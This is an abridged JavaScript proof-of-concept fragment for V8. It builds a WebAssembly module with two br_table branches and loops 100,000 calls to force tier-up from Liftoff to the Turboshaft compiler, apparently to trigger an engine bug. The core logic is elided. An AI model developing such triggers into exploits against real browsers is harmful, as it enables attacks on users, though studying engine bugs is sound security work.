function createWasmBinaryWithDualBrTables(tableSize1, tableSize2) {
  ...
  // All entries point to label 1 (which is $outer, since we're inside if which is label 0)
  ...
  // All entries point to label 1 (which is $outer, since we're inside else which is label 0)
...
try {
  ...
  print("\nCalling test function many times to trigger tier-up to Turboshaft...");
  // Call the function many times to trigger tier-up from Liftoff to Turboshaft
  // V8's tier-up threshold is typically around 10,000-100,000 calls
  const tierUpIterations = 100000;
  for (let i = 0; i < tierUpIterations; i++) {
    instance.exports.test(i % 100, i % 2);
  }
  print("Completed " + tierUpIterations + " iterations");

  // Test both branches after tier-up
...
// Run with: ./d8 poc.js
// Or with --no-liftoff to force immediate Turboshaft: ./d8 --no-liftoff poc.js